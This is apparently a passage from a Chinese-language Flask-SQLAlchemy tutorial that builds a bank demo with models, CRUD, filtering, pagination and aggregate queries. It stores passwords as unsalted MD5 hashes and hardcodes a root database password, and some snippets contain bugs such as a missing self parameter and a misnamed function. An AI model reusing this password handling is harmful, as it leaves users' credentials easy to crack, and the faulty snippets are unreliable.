<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">	<span class="built_in">id</span> = <span class="number">100</span></span><br><span class="line">    name = <span class="number">20</span></span><br><span class="line">    money = <span class="number">20000</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserDB</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save</span>(<span class="params">user: User</span>):</span><br><span class="line">        sql = <span class="string">&quot;insert into user(id, name) values(%s, %s)&quot;</span></span><br><span class="line">        <span class="keyword">with</span> self.db <span class="keyword">as</span> c:</span><br><span class="line">            c.execute(sql, args=(user.<span class="built_in">id</span>, user.name))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">      <span class="built_in">id</span> = <span class="number">1</span></span><br><span class="line">      name = <span class="string">&#x27;disen&#x27;</span></span><br><span class="line">      money = <span class="number">20000</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Order</span>():</span><br><span class="line">      number = <span class="number">1001</span></span><br><span class="line">      title = <span class="string">&#x27;huawei-10101&#x27;</span></span><br><span class="line">      price = <span class="number">19000</span></span><br><span class="line">      city = <span class="string">&#x27;xian&#x27;</span></span><br><span class="line">      cate = <span class="string">&#x27;手机神奇&#x27;</span></span><br><span class="line">      store = <span class="string">&#x27;神奇手机店&#x27;</span></span><br><span class="line">      phone = <span class="string">&#x27;11111111&#x27;</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">save</span>(<span class="params">entity</span>):</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">dir</span>(entity))</span><br><span class="line">      <span class="comment"># 读取对象的普通属性</span></span><br><span class="line">      <span class="built_in">print</span>([attr <span class="keyword">for</span> attr <span class="keyword">in</span> <span class="built_in">dir</span>(entity) <span class="keyword">if</span> <span class="keyword">not</span> attr.startswith(<span class="string">&#x27;__&#x27;</span>)])</span><br><span class="line">      <span class="built_in">print</span>(entity.__dict__)</span><br><span class="line">      <span class="built_in">print</span>(&#123;attr:<span class="built_in">getattr</span>(entity, attr) <span class="keyword">for</span> attr <span class="keyword">in</span> <span class="built_in">dir</span>(entity) <span class="keyword">if</span> <span class="keyword">not</span> attr.startswith(<span class="string">&#x27;__&#x27;</span>)&#125;)</span><br><span class="line">  </span><br><span class="line">      sql = <span class="string">&quot;insert into %s(%s) values(%s)&quot;</span></span><br><span class="line">      table = entity.__class__.__name__.lower()</span><br><span class="line">      colnames = <span class="string">&#x27;,&#x27;</span>.join([col <span class="keyword">for</span> col <span class="keyword">in</span> entity.__dict__])</span><br><span class="line">      colplaceholders = <span class="string">&#x27;,&#x27;</span>.join([<span class="string">&quot;%%(%s)s&quot;</span> % col <span class="keyword">for</span> col <span class="keyword">in</span> entity.__dict__])</span><br><span class="line">      sql = sql % (table, colnames, colplaceholders)</span><br><span class="line">      <span class="built_in">print</span>(sql)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">      u1 = User()</span><br><span class="line">      u1.<span class="built_in">id</span> = <span class="number">1000</span></span><br><span class="line">      u1.name = <span class="string">&#x27;jack&#x27;</span></span><br><span class="line">      u1.money = <span class="number">300000</span></span><br><span class="line">  </span><br><span class="line">      u2 = User()</span><br><span class="line">      u2.<span class="built_in">id</span> = <span class="number">2000</span></span><br><span class="line">      u2.name = <span class="string">&#x27;xi&#x27;</span></span><br><span class="line">      u2.money = <span class="number">3000000</span></span><br><span class="line">  </span><br><span class="line">      save(u1)</span><br><span class="line">      save(u2)</span><br><span class="line">  </span><br><span class="line">      o1 = Order()</span><br><span class="line">      o1.number = <span class="number">109919</span></span><br><span class="line">      o1.phone = <span class="string">&#x27;110&#x27;</span></span><br><span class="line">      o1.title = Order.title</span><br><span class="line">      o1.price = <span class="number">19000</span></span><br><span class="line">      o1.city = <span class="string">&#x27;北京&#x27;</span></span><br><span class="line">      save(o1)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 二、Flask-SQLAlchemy插件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 2.1 安装</span></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">pip install flask-sqlalchemy -i https://mirrors.aliyun.com/pypi/simple</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-2-配置"><a href="#2-2-配置" class="headerlink" title="2.2 配置"></a>2.2 配置</h3><p>在settings.Dev类进行配置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据库连接的路径 dialect+driver://user:password@ip:port/db?charset=utf8</span></span><br><span class="line">SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:123456@192.168.200.4:3306/bank&#x27;</span></span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span> <span class="comment"># 可扩展</span></span><br><span class="line">SQLALCHEMY_COMMIT_ON_TEARDOWN = <span class="literal">True</span> <span class="comment"># 回收资源时自动提交事务</span></span><br><span class="line">SQLALCHEMY_ECHO =<span class="literal">True</span> <span class="comment"># 显示调试SQL</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3-创建SQLAlchemy实例并初始化"><a href="#2-3-创建SQLAlchemy实例并初始化" class="headerlink" title="2.3 创建SQLAlchemy实例并初始化"></a>2.3 创建SQLAlchemy实例并初始化</h3><p>创建models模块，在它的“_<em>init</em>_.py”脚本中创建：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line">db = SQLAlchemy()</span><br></pre></td></tr></table></figure>

<p>在创建Flask对象app的脚本中，初始化SQLAlchemy类对象。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> db</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 初始化sqlalchemy类对象</span></span><br><span class="line">db.init_app(app)</span><br></pre></td></tr></table></figure>

<h3 id="2-4-实战项目"><a href="#2-4-实战项目" class="headerlink" title="2.4 实战项目"></a>2.4 实战项目</h3><ol>
<li><p>将银行系统下的所有表创建相应的模型类</p>
<p>1.1. 声明用户的模型类UserEntity，继承db.Model父类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认情况下：类名即为表名</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">	<span class="comment"># 声明字段（属性），默认情况下属性名与字段相同</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    number = db.Column(db.String(<span class="number">18</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">20</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">    phone = db.Column(db.String(<span class="number">20</span>))</span><br><span class="line">    password = db.Column(db.String(<span class="number">100</span>), nullable=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>1.2. 声明银行模型</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Bank</span>(db.Model):</span><br><span class="line">	<span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">31</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    address = db.Column(db.String(<span class="number">1023</span>), nullable=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>1.3 声明银行卡模型</p>
<p>1.4 声明交易模型</p>
</li>
<li><p>更新所有查询列表页面</p>
<p>2.1. 在用户的list2路由的处理函数中使用User模型类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> User</span><br><span class="line">   data = &#123;</span><br><span class="line">       <span class="string">&#x27;users&#x27;</span>: User.query.<span class="built_in">all</span>(),</span><br><span class="line">       <span class="string">&#x27;session&#x27;</span>: session</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>User.query.all()从数据库中查询所有的用户信息。</p>
</li>
</ol>
<h2 id="三、SQLAlchemy的CURD"><a href="#三、SQLAlchemy的CURD" class="headerlink" title="三、SQLAlchemy的CURD"></a>三、SQLAlchemy的CURD</h2><h3 id="3-1-模型创建数据-Create"><a href="#3-1-模型创建数据-Create" class="headerlink" title="3.1 模型创建数据(Create)"></a>3.1 模型创建数据(Create)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_create</span>(<span class="params">self</span>):</span><br><span class="line">    app.app_context().push()</span><br><span class="line"></span><br><span class="line">    user = User(name=<span class="string">&#x27;lixiaolong&#x27;</span>, number=<span class="string">&#x27;546656546546&#x27;</span>, phone=<span class="string">&#x27;5566645656&#x27;</span>, password=crypt.pwd(<span class="string">&#x27;333333&#x27;</span>))</span><br><span class="line">    db.session.add(user)</span><br><span class="line">    db.session.commit()  <span class="comment"># 提交事务</span></span><br></pre></td></tr></table></figure>

<h3 id="3-2-模型更新数据（Update）"><a href="#3-2-模型更新数据（Update）" class="headerlink" title="3.2 模型更新数据（Update）"></a>3.2 模型更新数据（Update）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_update</span>(<span class="params">self</span>):</span><br><span class="line">    app.app_context().push()</span><br><span class="line">    user = User.query.get(<span class="number">11</span>)</span><br><span class="line">    <span class="built_in">print</span>(user)</span><br><span class="line"></span><br><span class="line">    user.phone = <span class="string">&#x27;121&#x27;</span></span><br><span class="line">    user.name = <span class="string">&#x27;gaoxinyiyuan&#x27;</span></span><br><span class="line"></span><br><span class="line">    db.session.add(user)</span><br><span class="line">    db.session.commit()  <span class="comment"># 自动检测数据是否发生变化</span></span><br></pre></td></tr></table></figure>

<h3 id="3-3-模型删除数据（Delete）"><a href="#3-3-模型删除数据（Delete）" class="headerlink" title="3.3 模型删除数据（Delete）"></a>3.3 模型删除数据（Delete）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_delete</span>(<span class="params">self</span>):</span><br><span class="line">    app.app_context().push()</span><br><span class="line">    db.session.delete(User.query.get(<span class="number">11</span>))</span><br><span class="line">    db.session.commit()</span><br></pre></td></tr></table></figure>

<h3 id="3-4-模型读取数据（Read）"><a href="#3-4-模型读取数据（Read）" class="headerlink" title="3.4 模型读取数据（Read）"></a>3.4 模型读取数据（Read）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_filter</span>(<span class="params">self</span>):</span><br><span class="line">    app.app_context().push()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查询所有姓名中包含“e”字的用户</span></span><br><span class="line">    <span class="comment"># for u in User.query.filter(User.name.contains(&#x27;x&#x27;)):</span></span><br><span class="line">    <span class="comment">#     print(u)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查询所有“x”开头的用户</span></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> User.query.<span class="built_in">filter</span>(User.name.startswith(<span class="string">&#x27;x&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(u)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> User.query.<span class="built_in">filter</span>(User.name == <span class="string">&#x27;cheng&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(u)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从查询结果中读取一条记录</span></span><br><span class="line">    u = User.query.<span class="built_in">filter</span>(User.number == <span class="string">&#x27;666666666666666666&#x27;</span>).one()</span><br><span class="line">    <span class="built_in">print</span>(u)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">filter</span> = User.query.<span class="built_in">filter</span>(User.name == <span class="string">&#x27;cheng&#x27;</span>, User.password == crypt.pwd(<span class="string">&quot;000000&quot;</span>))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        login_user = <span class="built_in">filter</span>.one()</span><br><span class="line">        <span class="built_in">print</span>(login_user)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;账号或口令错误&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>crypt.pwd()函数的定义如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>(<span class="params">txt, hash_name=<span class="string">&#x27;md5&#x27;</span></span>):</span><br><span class="line">    <span class="comment"># 重命名的快捷键：shift+F6</span></span><br><span class="line">    hash_ = hashlib.md5() <span class="keyword">if</span> hash_name == <span class="string">&#x27;md5&#x27;</span> <span class="keyword">else</span> hashlib.sha1()</span><br><span class="line">    hash_.update(txt.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> hash_.hexdigest()</span><br><span class="line">    <span class="comment"># return hashlib.md5(txt.encode(&#x27;utf-8&#x27;)).hexdigest()</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_filter_or_not</span>(<span class="params">self</span>):</span><br><span class="line">    app.app_context().push()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查询编号不小于9的，或者是银行名包含“业”字</span></span><br><span class="line">    <span class="keyword">for</span> bank <span class="keyword">in</span> Bank.query.<span class="built_in">filter</span>(db.or_(</span><br><span class="line">        Bank.<span class="built_in">id</span> &gt;= <span class="number">9</span>,</span><br><span class="line">        Bank.name.like(<span class="string">&#x27;%业%&#x27;</span>)</span><br><span class="line">    )):</span><br><span class="line">        <span class="built_in">print</span>(bank.<span class="built_in">id</span>, bank.name, bank.address)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查询非‘西安’的银行</span></span><br><span class="line">    <span class="keyword">for</span> bank <span class="keyword">in</span> Bank.query.<span class="built_in">filter</span>(db.not_(Bank.name.contains(<span class="string">&#x27;西安&#x27;</span>))):</span><br><span class="line">        <span class="built_in">print</span>(bank.<span class="built_in">id</span>, bank.name, bank.address)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_filter_func</span>(<span class="params">self</span>):</span><br><span class="line">    app.app_context().push()</span><br><span class="line">    <span class="comment"># __ge__()相当于&gt;=</span></span><br><span class="line">    <span class="keyword">for</span> card <span class="keyword">in</span> Card.query.<span class="built_in">filter</span>(Card.money.__ge__(<span class="number">5000</span>)):</span><br><span class="line">        <span class="built_in">print</span>(card.number, card.money)</span><br></pre></td></tr></table></figure>

<h4 id="3-4-1-session的查询"><a href="#3-4-1-session的查询" class="headerlink" title="3.4.1 session的查询"></a>3.4.1 session的查询</h4><p>query()方法中指定的是查询的字段信息，filter()指定的是条件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.session.query(User.number, User.phone).<span class="built_in">filter</span>(user.name.like(<span class="string">&#x27;%i%&#x27;</span>)).<span class="built_in">all</span>()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.session.query(User.number, User.phone).first() <span class="comment">#查看第一条</span></span><br></pre></td></tr></table></figure>

<p><strong>针对query()查询结构集可以使用first()也可以使用all()及get(id)。</strong></p>
<p><strong>针对filter()查询结果集可以使用one()，all()</strong></p>
<h4 id="3-4-2-模型类的查询"><a href="#3-4-2-模型类的查询" class="headerlink" title="3.4.2 模型类的查询"></a>3.4.2 模型类的查询</h4><p>模型类可以直接发起查询，默认情况查询模型下的所有字段。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User.query.<span class="built_in">filter</span>(name=<span class="string">&#x27;disen&#x27;</span>)</span><br><span class="line"><span class="comment"># User.query(User.name, User.phone).all() #模型的query是不能被调用的</span></span><br></pre></td></tr></table></figure>

<h4 id="3-4-3-模型字段查询条件"><a href="#3-4-3-模型字段查询条件" class="headerlink" title="3.4.3 模型字段查询条件"></a>3.4.3 模型字段查询条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">== 等值查询		!= 不相等		&gt;= 或__ge__() 大于等于		&lt;= 或__le__() 小于等于</span><br><span class="line">in_((1,)) 包含		like() 模糊匹配 		startswith() 字符串开头匹配</span><br><span class="line">endswith() 字符串结尾匹配		contains() 字符串包含匹配</span><br></pre></td></tr></table></figure>

<h4 id="3-4-4-排序与分页"><a href="#3-4-4-排序与分页" class="headerlink" title="3.4.4 排序与分页"></a>3.4.4 排序与分页</h4><p>排序：order_by()，可以在query和filter之后使用order_by。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_model_order_page</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># 按身份证号排序</span></span><br><span class="line">    app.app_context().push()</span><br><span class="line">    <span class="comment"># 先按姓名排序，姓名相同时，再按身份证号排序</span></span><br><span class="line">    <span class="comment"># 默认按升序ASC-&gt; asc()，可以指定降序DESC-&gt; desc()</span></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> User.query.order_by(User.name, User.number.desc()).<span class="built_in">all</span>():</span><br><span class="line">        <span class="built_in">print</span>(u.number, u.name, u.phone)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> User.query.<span class="built_in">filter</span>(User.name.startswith(<span class="string">&#x27;x&#x27;</span>)).order_by(User.phone.desc()).<span class="built_in">all</span>():</span><br><span class="line">        <span class="built_in">print</span>(u.name, u.phone, u.number)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询银行卡的余额，按余额的降序排序</span></span><br><span class="line">       <span class="keyword">for</span> card <span class="keyword">in</span> db.session.query(Card).order_by(Card.money.desc()).<span class="built_in">all</span>():</span><br><span class="line">           <span class="built_in">print</span>(card.number, card.money)</span><br></pre></td></tr></table></figure>

<p>分页：offset()，limit()</p>
<p>如果分页函数与order_by组合使用时，必须放在order_by之后。分页函数可以用在query和filter之后。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">AS</span> count_1 </span><br><span class="line"><span class="keyword">FROM</span> (</span><br><span class="line">	<span class="keyword">SELECT</span> user.id <span class="keyword">AS</span> user_id, user.number <span class="keyword">AS</span> user_number, user.name <span class="keyword">AS</span> user_name, user.phone <span class="keyword">AS</span> user_phone, user.password <span class="keyword">AS</span> user_password </span><br><span class="line">	<span class="keyword">FROM</span> <span class="keyword">user</span> </span><br><span class="line"> <span class="keyword">WHERE</span> (user.phone <span class="keyword">LIKE</span> concat(<span class="operator">%</span>(phone_1)s, <span class="string">&#x27;%%&#x27;</span>)) </span><br><span class="line"> <span class="keyword">OR</span> (user.phone <span class="keyword">LIKE</span> concat(<span class="operator">%</span>(phone_2)s, <span class="string">&#x27;%%&#x27;</span>)) </span><br><span class="line"> <span class="keyword">ORDER</span> <span class="keyword">BY</span> user.phone) <span class="keyword">AS</span> anon_1</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_page</span>(<span class="params">self</span>):</span><br><span class="line">    app.app_context().push()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查询以“1”或“2”开头手机号的用户信息</span></span><br><span class="line">    <span class="comment"># 先按手机号排序，再分页</span></span><br><span class="line">    query_set = User.query.<span class="built_in">filter</span>(db.or_(User.phone.startswith(<span class="string">&#x27;1&#x27;</span>),</span><br><span class="line">                                      User.phone.startswith(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    )).order_by(User.phone);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> self.page_data(query_set, page=<span class="number">2</span>).<span class="built_in">all</span>():</span><br><span class="line">        <span class="built_in">print</span>(u.name, u.phone)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_data</span>(<span class="params">self, query_set, page_size=<span class="number">3</span>, page=<span class="number">1</span></span>):</span><br><span class="line">    total = query_set.count()</span><br><span class="line">    pages = total // page_size + ( <span class="number">1</span> <span class="keyword">if</span> total % page_size &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;总条数：%s, 每页显示%s条，总页数：%s&#x27;</span> % (total, page_size, pages))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> page &gt; pages:</span><br><span class="line">        page = pages</span><br><span class="line">    <span class="keyword">elif</span> page &lt;= <span class="number">0</span>:</span><br><span class="line">        page = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------------------显示第%s页-------------------------------&#x27;</span> % page)</span><br><span class="line">    <span class="keyword">return</span> query_set.offset((page-<span class="number">1</span>)*page_size).limit(page_size)</span><br></pre></td></tr></table></figure>

<h1 id="WEB后端服务-Flask第五天"><a href="#WEB后端服务-Flask第五天" class="headerlink" title="WEB后端服务-Flask第五天"></a>WEB后端服务-Flask第五天</h1><h2 id="一、聚合查询"><a href="#一、聚合查询" class="headerlink" title="一、聚合查询"></a>一、聚合查询</h2><p>SQLAlchemy支持聚合查询，使用db.session.query()查询和db.func.聚合函数()。</p>
<p>常用的聚合查询函数：</p>
<ul>
<li><p>db.dunc.count(模型类的字段) 统计</p>
</li>
<li><p>db.func.sum() 求和</p>
</li>
<li><p>db.func.min() 最小值</p>
</li>
<li><p>db.func.max() 最大值</p>
</li>
<li><p>db.func.avg() 平均值</p>
<p>以上的聚合函数与mysql中聚合函数一一对应。可以在聚合函数后面使用.label()设置别名。</p>
<p>另外，聚合函数中使用模型类字段必须出现在.group_by()函数中。当然也可以在group_by()之后使用having()设置聚合字段结果的条件，如总财富不少于多少钱，总人数不少于多少人等。在having()中可以使用.label()设定的别名。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_sum_money</span>(<span class="params">self</span>):</span><br><span class="line">    app.app_context().push()</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 查询每个人的财富</span></span><br><span class="line">    result = db.session.query(Card.user_id, db.func.<span class="built_in">sum</span>(Card.money).label(<span class="string">&#x27;total&#x27;</span>)</span><br><span class="line">                              ).group_by(Card.user_id).having(db.func.<span class="built_in">sum</span>(Card.money) &gt; <span class="number">20000</span></span><br><span class="line">                                                              ).order_by(db.Column(<span class="string">&#x27;total&#x27;</span>).desc()).<span class="built_in">all</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(result))  <span class="comment"># list[(user_id, total), ..]</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 二次查询</span></span><br><span class="line">    user_totals = [ (User.query.get(user_id), money) <span class="keyword">for</span> user_id, money <span class="keyword">in</span> result]</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> user, money <span class="keyword">in</span> user_totals:</span><br><span class="line">        <span class="built_in">print</span>(user.name, user.phone, money)</span><br></pre></td></tr></table></figure>

